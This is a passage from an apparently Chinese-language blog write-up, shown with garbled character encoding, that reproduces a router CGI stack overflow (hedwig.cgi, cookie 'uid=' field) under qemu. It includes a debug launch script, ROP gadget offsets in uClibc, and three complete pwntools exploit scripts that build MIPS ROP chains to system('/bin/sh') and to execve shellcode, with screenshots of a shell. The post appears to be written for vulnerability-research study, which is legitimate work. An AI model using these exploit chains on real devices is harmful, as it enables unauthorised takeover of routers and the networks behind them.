<p>è¿›å…¥ <code>403B10</code> å‡½æ•°ï¼Œé¦–å…ˆ <code>CONTENT_TYPE</code> åœ¨åŸæœ¬çš„ <code>aApplication</code> åé¢è¦å†åŠ ä¸Šå­—ç¬¦ä¸² <code>x-www-form-urlencoded</code> æ‰èƒ½è¿›å…¥ä¸»é€»è¾‘éƒ¨åˆ†ã€‚ <code>read</code> ä¼šè¯»å…¥ <code>0xc</code> ä¸ªæ•°æ®ï¼Œç„¶åå°†è¿™ä¸ªè¾“å…¥çš„æ•°æ®ä½œä¸ºå‚æ•°è°ƒç”¨ <code>402B40</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°†åˆšåˆšè¯»å…¥çš„æ•°æ®ï¼Œä»¥ <code>=</code> è¿›è¡Œåˆ†å‰²ã€‚æ¥ç€è°ƒç”¨äº†å‡½æ•°æŒ‡é’ˆ <code>v9</code> ï¼ˆè¿™ä¸ª <code>v9</code> å°±æ˜¯æœ€å¼€å§‹æ‰€è¯´çš„å›è°ƒå‡½æ•° <code>409A6C</code> ï¼‰ï¼Œè€Œåˆšåˆš <code>=</code> å‰é¢çš„æ•°æ®ä¼šè¢«å½“åšå‚æ•°ä¼ è¿›æ¥ï¼Œä¸‹é¢å†çœ‹ä¸€ä¸‹ <code>409A6c</code> å‡½æ•°</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211102535.png" alt="image-20230521110226484"></p>
<p>å› æ­¤åªè¦èµ°åˆ°è¿™é‡Œï¼Œ<code>haystack</code> å°±ä¼šè¢«èµ‹å€¼æˆ <code>=</code> å‰é¢å­—ç¬¦ä¸²çš„åœ°å€ã€‚ä»è€Œç»•è¿‡ <code>if ( !haystack )</code> è¿™ä¸ªåˆ¤æ–­ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹èµ‹å€¼ <code>haystack</code> çš„å‡½æ•°è°ƒç”¨é“¾ ï¼š<code>cgibin_parse_requeset -&gt; 403b10 -&gt; 402b40 -&gt; å‡½æ•°æŒ‡é’ˆv9</code> ï¼Œåˆå­¦è€…å¯ä»¥è‡ªè¡Œå»è¯¦ç»†åˆ†æä¸Šè¿°è¿‡ç¨‹ã€‚</p>
<h3 id="qemu-ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°"><a href="#qemu-ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°" class="headerlink" title="qemu ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°"></a><code>qemu</code> ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°</h3><h4 id="ROP-é“¾çš„å¸ƒç½®"><a href="#ROP-é“¾çš„å¸ƒç½®" class="headerlink" title="ROP é“¾çš„å¸ƒç½®"></a><code>ROP</code> é“¾çš„å¸ƒç½®</h4><p>ç°åœ¨æ˜¯è‚¯å®šèƒ½èµ°åˆ°ç¬¬äºŒæ¬¡çš„ <code>sprintf</code> è¿›è¡Œæº¢å‡ºäº†ã€‚ç°åœ¨æˆ‘ä»¬æ¥æµ‹ä¸€ä¸‹æº¢å‡ºæ§åˆ¶è¿”å›åœ°å€çš„åç§»é‡æ˜¯å¤šå°‘ã€‚</p>
<h5 id="å¦‚ä½•è°ƒè¯•"><a href="#å¦‚ä½•è°ƒè¯•" class="headerlink" title="å¦‚ä½•è°ƒè¯•"></a>å¦‚ä½•è°ƒè¯•</h5><p>å…ˆå‡†å¤‡ä¸€ä¸ª <code>payload</code> æ–‡ä»¶ï¼Œé‡Œé¢æ”¾å…¥ <code>COOKIE</code> çš„å€¼ï¼Œè¿™é‡Œç›´æ¥ç”¨ <code>cyclic 2000 &gt; payload</code> ï¼Œä¸è¿‡åˆ«å¿˜è®°åœ¨æœ€å¼€å§‹åŠ ä¸€ä¸ª <code>uid=</code> å­—ç¬¦ä¸²</p>
<p>ç„¶åå†™ä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ä¸‹è¿™ä¸ªè„šæœ¬ã€‚é¦–å…ˆä½¿ç”¨ <code>chroot</code> å‘½ä»¤å°†å½“å‰ç›®å½• <code>squashfs-root</code> è®¾ç½®ä¸ºæ ¹ç›®å½•ï¼Œå› ä¸ºç¨‹åºæ‰“å¼€çš„æ–‡ä»¶éƒ½æ˜¯ç›¸å¯¹äºè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿæ¥è¯´çš„ã€‚ä¸€æ—¦å°† <code>squashfs-root</code> è®¾ç½®ä¸ºæ ¹ç›®å½•ï¼Œé‚£ä¹ˆ <code>qemu-mipsel</code>  å°±æ²¡åŠæ³•ä½¿ç”¨äº†ï¼Œå› ä¸ºä¾èµ–äº†å…¶ä»–ç›®å½•çš„åº“æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨é™æ€é“¾æ¥çš„ <code>qemu-mipsel-static</code> ï¼ˆæˆ‘çš„ <code>ubuntu 18.04</code> ä¸Šç”¨ <code>apt-get install</code> å®‰è£…çš„ <code>qemu-mipsel-static</code> ä¼šæŠ¥ä¸€ä¸ªé”™è¯¯</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211510370.png" alt="image-20230521151058316"></p>
<p>åŸå› æ˜¯è¿™ä¸ª <code>qemu-mipsel-static</code> ç‰ˆæœ¬å¤ªä½ï¼Œæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯åœ¨ <code>ubuntu 22.04</code> ä¸Šå®‰è£…åï¼Œæ‹–åˆ°äº† <code>18.04</code> ä¸Šï¼‰  </p>
<p><code>-E</code> ç”¨äºæŒ‡å®šè¦åœ¨æ¨¡æ‹Ÿçš„è™šæ‹Ÿæœºä¸­è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œè€Œè¿™äº›å˜é‡æ˜¯å‰é¢åˆ†æè¿‡çš„ï¼Œè¿›è¡Œè®¾ç½®å³å¯,å‰©ä¸‹çš„å°±å’Œè°ƒè¯• <code>MIPS</code> æ¶æ„çš„ç¨‹åºä¸€æ ·äº†ï¼Œæœ‰éœ€è¦çš„è¯å¯ä»¥æŸ¥çœ‹è¿™ç¯‡ <a href="https://zikh26.github.io/posts/919c29c4.html#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F">æ–‡ç« </a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">payload=$(echo &quot;$(cat payload)&quot;)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=666 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$payload -E REQUEST_URL=&quot;zikh26&quot;  -g 1234 /htdocs/web/hedwig.cgi </span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211147020.png" alt="image-20230521114724909"></p>
<p>å‘ç°è¦†ç›–åˆ°è¿”å›åœ°å€éœ€è¦å¡«å…… <code>1043</code> çš„åƒåœ¾æ•°æ®ã€‚</p>
<p>é€šè¿‡è§‚å¯Ÿå‡½æ•°æœ€åè¿”å›å¤„çš„æ±‡ç¼–ï¼Œè¿™é‡Œæ˜¯å¯ä»¥æ§åˆ¶å¾ˆå¤šå¯„å­˜å™¨ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é€šè¿‡è¿™äº›å¯æ§çš„å¯„å­˜å™¨æ¥å®Œæˆ <code>ROP</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211148333.png" alt="image-20230521114847280"></p>
<h5 id="ROP-system"><a href="#ROP-system" class="headerlink" title="ROP-system"></a>ROP-system</h5><p>å› ä¸ºè¿™ä¸ªç¨‹åºçš„æº¢å‡ºæ˜¯ <code>sprintf</code> å¯¼è‡´çš„ï¼Œ <code>\x00</code> å¯ä»¥é€ æˆå­—ç¬¦ä¸²çš„æˆªæ–­ï¼Œè€Œ <code>system</code> å‡½æ•°åœ°å€æœ«å°¾å°±æ˜¯ <code>\x00</code> ï¼Œä¸ºäº†é¿å…è¢«æˆªæ–­ï¼Œæˆ‘ä»¬è¦å…ˆè®© <code>system</code> å‡½æ•°çš„åœ°å€å‡ä¸€æ”¾å…¥ä¸€ä¸ªå¯„å­˜å™¨ï¼Œä¹‹åè·³è½¬åˆ°èƒ½è®©è¿™ä¸ªå¯„å­˜å™¨åŠ ä¸€çš„ <code>gadget</code> ä¸Šã€‚<code>MIPS</code> æ¶æ„çš„ <code>ROP</code> æ˜¯é€šè¿‡å¯„å­˜å™¨é—´çš„è·³è½¬å®ç°çš„ï¼Œè€Œ <code>x86</code> ä¸­é€šå¸¸æ˜¯ç”¨ <code>ret</code> æŒ‡ä»¤æ ¹æ®æ ˆä¸­å­˜æ”¾çš„æ•°æ®æ¥è·³è½¬çš„ã€‚</p>
<p>åœ¨ ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯ã€‹ä¸€ä¹¦ä¸­å¯¹è¯¥ <code>ROP</code>  é“¾å¸ƒå±€ç”»çš„ååˆ†å½¢è±¡ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå› ä¸ºä¸Šé¢æåˆ°äº†æˆ‘ä»¬èƒ½æ§åˆ¶å¾ˆå¤šå¯„å­˜å™¨ï¼Œå°±å…ˆåœ¨ <code>$ra</code> å¯„å­˜å™¨å¸ƒç½®ä¸€ä¸ªè®© <code>$s0</code> åŠ ä¸€çš„ <code>gadget</code> ï¼ˆæå‰æ§åˆ¶ <code>$s0</code> ä¸º <code>system</code> å‡ä¸€çš„åœ°å€ï¼‰ï¼Œæ¥ç€è·³è½¬åˆ°ä¸€æ®µèƒ½èµ‹å€¼æ ˆåœ°å€çš„ <code>gadget</code> ä¸Šï¼ˆç”¨äºæŒ‡å‘ <code>/bin/sh</code> ï¼‰ï¼Œæœ€åè·³å›åˆ° <code>system</code> ä¸Š</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211441230.png" alt="image-20230521144117106"></p>
<p>è¡¥å……ï¼š</p>
<ol>
<li>ç¨‹åºä¾èµ–çš„ <code>libc</code> æ˜¯è½¯é“¾æ¥ <code>libc.so.0</code> æŒ‡å‘çš„ <code>libuClibc-0.9.30.1.so</code> ï¼Œå› æ­¤ <code>gadget</code> è¦å»è¿™ä¸ªé‡Œé¢æ‰¾</li>
<li>æ‰¾ <code>gadget</code> çš„è¯ï¼Œç”¨ <code>IDA</code> æ’ä»¶ <code>mipsrop</code> ã€‚ä»¥ä¸Šé¢ä¸¤æ®µ <code>gadget</code> ä¸ºä¾‹ï¼Œæœå¯„å­˜å™¨åŠ ä¸€çš„æŒ‡ä»¤å¯ä»¥è¿™ä¹ˆæœ <code>mipsrop.find(&quot;addiu .*,1&quot;)</code> ï¼Œå½“ç„¶äº†å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™</li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211457716.png" alt="image-20230521145755628"></p>
<p>åªéœ€è¦ç‚¹ä¸€ä¸‹ <code>search -&gt; mips rop gadgets</code>  å³å¯</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211458582.png" alt="image-20230521145839462"></p>
<p>èƒ½åŒ¹é…åˆ°å¾ˆå¤šä¸ª <code>gadget</code> ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ ¹æ®è‡ªå·±å¸ƒå±€çš„éœ€æ±‚æ¥é€‰æ‹©åˆé€‚çš„å°±å¯ä»¥</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211500301.png" alt="image-20230521150004230"></p>
<p>å¦‚æœè¦æœå°†æ ˆåœ°å€æ”¾å…¥æŸä¸ªå¯„å­˜å™¨çš„ <code>gadget</code> ï¼Œå¯ä»¥ç”¨ <code>mipsrop.stackfinder()</code> å‘½ä»¤ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211502965.png" alt="image-20230521150247898"></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">winmt</a> å¸ˆå‚…æåˆ° ç”¨æˆ·æ¨¡å¼ä¸æ”¯æŒå¤šçº¿ç¨‹ï¼Œè€Œ <code>system</code> å‡½æ•°ä¼šè°ƒç”¨ <code>fork</code> å‡½æ•°ï¼Œä»è€Œå¯¼è‡´ <code>fork</code> æ‰§è¡Œå¤±è´¥ï¼Œ<code>system</code> æ‰§è¡Œåˆ°è¿™é‡Œåå°±ä¼šå¡ä½ã€‚ä¸è¿‡ä¹‹ååœ¨ç³»ç»Ÿæ¨¡å¼ä¸‹æ˜¯æ²¡é—®é¢˜çš„</p>
<h6 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x159cc</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin//sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211521976.png" alt="image-20230521152152411" style="zoom:50%;" />

<p>ä¸Šé¢çš„ <code>exp</code> æ˜¯å¯ä»¥æ­£å¸¸èµ°åˆ° <code>system</code> å‡½æ•°çš„ï¼Œä½†æ˜¯ <code>a0</code> æ˜¯ <code>/bin//sh/postxml</code> ï¼Œè¿™æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡ <code>sprintf</code> æ‹¼æ¥äº†åé¢çš„å­—ç¬¦ä¸²å¸¸é‡ <code>postxml</code> ã€‚å› ä¸ºåœ°å€å›ºå®šçš„åŸå› ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>libc</code> ä¸­çš„ <code>/bin/sh</code> åœ°å€ EXPå¦‚ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(bin_sh_addr)<span class="comment">#$s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x4e0ec</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh;deadbeef;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211526368.png" alt="image-20230521152651843" style="zoom: 50%;" />

<p>å¯ä»¥å‘ç°è¿™æ¬¡æ˜¯æˆåŠŸæ‰§è¡Œåˆ°äº† <code>system(&quot;/bin/sh&quot;)</code> ï¼Œå› ä¸º <code>fork</code> çš„åŸå› ï¼Œä¾ç„¶æ˜¯æ‹¿ä¸åˆ° <code>shell</code></p>
<h5 id="ROP-ret2shellcode"><a href="#ROP-ret2shellcode" class="headerlink" title="ROP-ret2shellcode"></a>ROP-ret2shellcode</h5><p>æ˜ç™½äº†ä¸Šé¢ <code>ROP</code> çš„æ€æƒ³ï¼Œé‚£ä¹ˆå¸ƒç½® <code>shellcode</code> ä¹Ÿå°±ä¸åœ¨è¯ä¸‹ï¼Œå› ä¸º <code>shellcode</code> èƒ½ç›´æ¥è°ƒç”¨ <code>execve</code> ä»è€Œä¸éœ€è¦å»ä½¿ç”¨ <code>fork</code>ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ <code>shellcode</code> ä¸­ä¸èƒ½å‡ºç° <code>\x00</code> è¿˜æœ‰ç¼“å­˜ä¸ä¸€è‡´æ€§ï¼ˆæ•°æ®ç¼“å­˜åŒºå’ŒæŒ‡ä»¤ç¼“å­˜åŒºéœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼‰ï¼Œå› æ­¤éœ€è¦å…ˆè°ƒç”¨ä¸€ä¸‹ <code>sleep(1)</code> å†å»æ‰§è¡Œ <code>shellcode</code>ã€‚</p>
<p>è¿™é‡Œè¿˜éœ€è¦æåˆ°ä¸€ç‚¹ï¼Œå¦‚æœç°åœ¨æ‰§è¡Œäº† <code>gadgetA</code> ï¼Œç„¶åè·³è½¬åˆ°äº† <code>sleep(1)</code> å‡½æ•°ï¼Œç­‰å‡½æ•°è¿”å›æ—¶ä¼šå†è·³è½¬åˆ°äº† <code>gadgetA</code>ï¼Œå› æ­¤å¿…é¡»è¦ä¿è¯ <code>gadgetA</code> å›æ¥åä¾ç„¶èƒ½å»è·³è½¬åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ï¼Œä»¥æ­¤æ¥ä¿è¯ <code>ROP</code> ä¸é—´æ–­ã€‚</p>
<p>ç”»äº†ä¸ªæŠ½è±¡çš„å›¾ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305240902843.png" alt="image-20230524090213648" style="zoom: 67%;" />

<h6 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">sleep=libc_base+<span class="number">0x56bd0</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*(<span class="number">1007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x436D0 =&gt; move $t9,$s3 ; jalr $t9</span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x57E50 =&gt; li $a0,1 ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x436d0</span>)<span class="comment">#$s1</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s2</span></span><br><span class="line">payload+=p32(sleep)<span class="comment">#$s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57e50</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0xdef0</span>)<span class="comment">#second return address $ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211617086.png" alt="image-20230521161702923"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ¬¡æ˜¯æ‹¿åˆ° <code>shell</code> äº†ã€‚ä¸è¿‡è¿™é‡Œæ‰§è¡Œ <code>execve(&quot;/bin/sh&quot;)</code> æˆåŠŸå…¶å®æ˜¯ä¸€ç§å‡è±¡ï¼Œå› ä¸ºå›ºä»¶ä¸­çš„ <code>/bin/sh</code> é“¾æ¥åˆ°äº† <code>busybox</code> ä¸Šï¼Œè™½ç„¶ <code>busybox</code> æ˜¯é™æ€é“¾æ¥ï¼Œä½†å› ä¸ºå®ƒæ˜¯ <code>MIPS</code> æ¶æ„ï¼Œå¯¼è‡´äº†æˆ‘åœ¨ <code>x64</code> ä¸Šç›´æ¥æ‰§è¡Œæ˜¯å¤±è´¥çš„ã€‚å› æ­¤æˆ‘ä¸Šé¢æ˜¯æŠŠåŸæœ¬çš„ <code>sh</code> ç»™åˆ æ‰ï¼Œæ¢æˆäº†ä¸»æœºè‡ªå¸¦çš„ <code>x64</code> æ¶æ„çš„ <code>sh</code> ï¼ŒåŒæ—¶è¿˜æŠŠç›¸åº”çš„åŠ¨æ€åº“éƒ½æ”¾åˆ°äº†å½“å‰çš„ <code>/lib</code> ä¸‹é¢ï¼Œæ‰ç®—æ‰§è¡ŒæˆåŠŸã€‚ä¸ç„¶ç”¨åŸæœ¬çš„ <code>sh</code> è¿˜æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œè¿™ä¹ˆåšçš„ç›®çš„ä»…ä»…æ˜¯ä¸ºäº†è¯æ˜è¿™ç§æ“ä½œç†è®ºä¸Šæ˜¯å¯ä»¥æ‹¿åˆ° <code>shell</code> çš„ ğŸ˜</p>
<h3 id="qemu-ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°"><a href="#qemu-ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°" class="headerlink" title="qemu ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°"></a><code>qemu</code> ç³»ç»Ÿæ¨¡å¼ä¸‹å¤ç°</h3><p>åªè¦åœ¨ <code>qemu</code> ç”¨æˆ·æ¨¡å¼ä¸‹èƒ½å¤ç°æˆåŠŸï¼Œå¹¶ä¸”ææ¸…æ¥šåŸç†ï¼Œå…¶å®è¿™ä¸ª <code>qemu</code> ç³»ç»Ÿæ¨¡å¼æçš„å¾ˆå¿«ã€‚é¦–å…ˆå®ç°ä¸€ä¸‹ <code>qemu</code> ä¸å®¿ä¸»æœºçš„é€šä¿¡ï¼Œç„¶åæŠŠ <code>httpd</code> æœåŠ¡å¯èµ·æ¥å°±å¯ä»¥å‘é€æ•°æ®åŒ…ç›´æ¥æ‰“äº†ï¼ˆåœ¨ä¸é‡åˆ°ä»€ä¹ˆå¥‡æ€ªçš„æŠ¥é”™ä¸‹ç¡®å®æ¯”è¾ƒå¿«â€¦ï¼‰</p>
<p>æˆ‘è¿™é‡Œçš„ç¯å¢ƒæ˜¯ <code>ubuntu 18.04</code> <code>qemu-system-mipsel 7.2.0</code> </p>
